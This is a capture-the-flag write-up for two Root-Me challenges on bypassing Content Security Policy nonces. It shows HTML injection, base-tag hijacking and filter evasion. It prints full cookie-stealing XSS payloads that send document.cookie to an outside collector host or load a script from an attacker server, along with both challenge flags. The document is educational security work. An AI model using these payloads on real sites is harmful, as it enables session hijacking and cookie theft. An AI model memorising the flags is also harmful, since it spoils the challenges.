# CSP Bypass Nonce

## Nonce 1

### Description

A developer who is a fan of quotes has developed a site that displays a quote by entering his nickname. This developer was very aware of security, so he used CSPs and filters that are foolproof for him. Prove him wrong by bringing back his cookies!

[Start the challenge](http://challenge01.root-me.org/web-client/ch49/)

### Solution

We are asked to Send a username, in this case Test, and then we are given a quote. Not sure what's going on with iframe in background tho.

![csp-bypass---nonce.png](/assets/ctf/root-me/csp-bypass-nonce.png)

It is possible to inject arbitrary HTML
```http
http://challenge01.root-me.org/web-client/ch49/?username=<h1>Test</h1>
```

![csp-bypass---nonce-1.png](/assets/ctf/root-me/csp-bypass-nonce-1.png)

CSP is pretty secure, except it's missing `base-uri`
```bash
connect-src 'none'; font-src 'none'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'nonce-PGgxPlRlc3Q8LzE0LTMtMjAyNQ=='; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;
```

![csp-bypass---nonce-2.png](/assets/ctf/root-me/csp-bypass-nonce-2.png)

The script nonce from CSP is consistent, which is not good.
```powershell
➜ 1..5 | % { curl http://challenge01.root-me.org/web-client/ch49/?username=$_ -sI | sls "script-src 'nonce-[^']*'" | %{ $_.Matches.Value } }
script-src 'nonce-MUFBQUFBQUFBQTE0LTMtMjAyNQ=='
script-src 'nonce-MkFBQUFBQUFBQTE0LTMtMjAyNQ=='
script-src 'nonce-M0FBQUFBQUFBQTE0LTMtMjAyNQ=='
script-src 'nonce-NEFBQUFBQUFBQTE0LTMtMjAyNQ=='
script-src 'nonce-NUFBQUFBQUFBQTE0LTMtMjAyNQ=='
```

The word `nonce` can be defined as a word or phrase that is intended for use only once. If you were a spy, you might come up with a nonce as a code word to authenticate a rendezvous. [source](https://content-security-policy.com/nonce/)

It being not random and `base-uri` not protected we can potentially hijack the `base-uri` and execute scripts from our server.

The **`<base>`** [HTML](https://developer.mozilla.org/en-US/docs/Web/HTML) element specifies the base URL to use for all _relative_ URLs in a document. There can be only one `<base>` element in a document. [source](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base)

I think the following should have just worked, but dot (`.`) and quote (`'`) are blocked and it's not getting executed. Inline execution is disabled by CSP.
```html
<script nonce="eEFBQUFBQUFBQTE0LTMtMjAyNQ==" src="http://somewhere.tld/payload.js"></script>
```

Okay, so turns out the nonce is never even included in first place, some filter is removing the value completely.

![csp-bypass---nonce-3.png](/assets/ctf/root-me/csp-bypass-nonce-3.png)

Hmm... odd. Turns out the nonce value changes like every 10 second or smth and that was the failure reason.

```html
<script nonce=PHNjcmlwdCBubzE0LTMtMjAyNQ==>alert(1);</script>
```

![csp-bypass---nonce-4.png](/assets/ctf/root-me/csp-bypass-nonce-4.png)

> **Note**: Make sure to read errors, not like me

Ok, we can forget about `base` tag for now and just get cookies via script tags.

`document` word is blocked, but since we are in Javascript bypass is simple

![csp-bypass---nonce-5.png](/assets/ctf/root-me/csp-bypass-nonce-5.png)

To bypass dots we can use concatenation, but I just used base64
```js
> btoa("https://uwuos.free.beeceptor.com/?")
'aHR0cHM6Ly91d3Vvcy5mcmVlLmJlZWNlcHRvci5jb20vPw=='
> btoa("document")
'ZG9jdW1lbnQ='
```

Payload:
```html
<script nonce="PHNjcmlwdCBubzE0LTMtMjAyNQ==">window[atob("ZG9jdW1lbnQ=")]["location"]=atob("aHR0cHM6Ly91d3Vvcy5mcmVlLmJlZWNlcHRvci5jb20vPw==")+window[atob("ZG9jdW1lbnQ=")]["cookie"]</script>

<!--
http://challenge01.root-me.org/web-client/ch49/?username=<script+nonce%3D"PHNjcmlwdCBubzE0LTMtMjAyNQ%3D%3D">window%5Batob%28"ZG9jdW1lbnQ%3D"%29%5D%5B"location"%5D%3Datob%28"aHR0cHM6Ly91d3Vvcy5mcmVlLmJlZWNlcHRvci5jb20vPw%3D%3D"%29%2Bwindow%5Batob%28"ZG9jdW1lbnQ%3D"%29%5D%5B"cookie"%5D<%2Fscript>
-->
```

Alternatively if you own a domain you can host your own files. As long as you have IP serving a server you can convert IP to something [like Decimal IP](https://www.browserling.com/tools/ip-to-dec) and use that as host. `1.2.3.4` -> `16909060`. AFAIK most modern (existing) domains will fail because vhost serving is more optimal then IP.

```bash
# On webserver, served with nginx
➜  html pwd
/var/www/html
➜  html nano letmein
➜  html cat letmein
document.location = 'https://uwuos.free.beeceptor.com/?c=' + document.cookie
```

```powershell
➜ curl YOUR_SERVER_IP_IN_DECIMAL/letmein -i
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 14 Mar 2025 13:25:29
Content-Type: application/octet-stream
Content-Length: 76
Last-Modified: Fri, 14 Mar 2025 13:22:03
Connection: keep-alive
ETag: "67d42d7b-4c"
Accept-Ranges: bytes

document.location = 'https://uwuos.free.beeceptor.com/?c=' + document.cookie
```

> **Note**: Tried searching for a solution which didn't involve using VPS, but nothing. It should be possible to include scripts from services like pastebins, but due to them only using vhost it failed. 

```html
<script nonce=PHNjcmlwdCBubzE0LTMtMjAyNQ== src="http://YOUR_SERVER_IP_IN_DECIMAL/letmein"></script>

<!--
http://challenge01.root-me.org/web-client/ch49/?username=<script+nonce%3DPHNjcmlwdCBubzE0LTMtMjAyNQ%3D%3D+src%3D"http%3A%2F%2FYOUR_SERVER_IP_IN_DECIMAL%2Fletmein"><%2Fscript>
-->
```

![csp-bypass---nonce-6.png](/assets/ctf/root-me/csp-bypass-nonce-6.png)

> Flag: `rootme{CSP_BYP455_n0nC3}`

## Nonce 2

### Description

A developer who loves colors decided to put a site online after being hacked. Since his trauma, he is unbeatable in CSP and is now confident....  
Show him that you can steal his cookies and save him from another trauma!

[Start the challenge](http://challenge01.root-me.org/web-client/ch62/)

### Solution

We can inject arbitrary html into website using [fragment identifier](https://developer.mozilla.org/en-US/docs/Web/API/URL/hash)

![csp-bypass---nonce-7.png](/assets/ctf/root-me/csp-bypass-nonce-7.png)

CSP is pretty tight too
```bash
connect-src 'none'; font-src 'self'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'nonce-a0aa3bfcef5fb4d549a19d9c119222ca'; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;
```

![csp-bypass---nonce-8.png](/assets/ctf/root-me/csp-bypass-nonce-8.png)

Nonce is actually different each time we got on website, so it's properly secured.
```powershell
➜ 1..5 | % { curl http://challenge01.root-me.org/web-client/ch62/#$_ -sI | sls "script-src 'nonce-[^']*'" | %{ $_.Matches.Value } }
script-src 'nonce-0f36f85ba1b98dcf1873ebda5eacd6b1'
script-src 'nonce-47a75d81b870a6668ebc8d85d82d8507'
script-src 'nonce-1adddf0512015cb4a9fd6ddfd117e599'
script-src 'nonce-6761390f557c66a092ccbff2dd773ad4'
script-src 'nonce-c377b6184c2b66e62011e305363a8e50'
```

The source is including Javascript files and since `base` tag is not secured we can hijack it
```html
<script src="/web-client/ch62/color.js" nonce="8c2dc7e351018d5921c929fa49da2b08"></script>
```

I somewhat already talked about `base` tag on Nonce 1, so not gonna repeat it here.

Not sure if this is possible without VPS or server you have access to. But basically setup the path and file so when file is requested it's accessible.
```bash
➜  html pwd
/var/www/html
➜  html mkdir web-client/ch62 -p
➜  html nano web-client/ch62/color.js
document.location = 'https://uwuos.free.beeceptor.com/?c=' + document.cookie

➜  html curl http://YOUR_SERVER/web-client/ch62/color.js
document.location = 'https://uwuos.free.beeceptor.com/?c=' + document.cookie
```

After refreshing the page embedded `base` tag was displayed as text so injection somewhat failed. After adding closing `p` tag then it worked.
```html
</p><base href="http://YOUR_SERVER/" />

<!--
http://challenge01.root-me.org/web-client/ch62/#</p><base%20href="http://YOUR_SERVER/"%20/>
-->
```

![csp-bypass---nonce-9.png](/assets/ctf/root-me/csp-bypass-nonce-9.png)

> Flag: `rootme{d0nt_f0rg3t_b4se_uR1}`

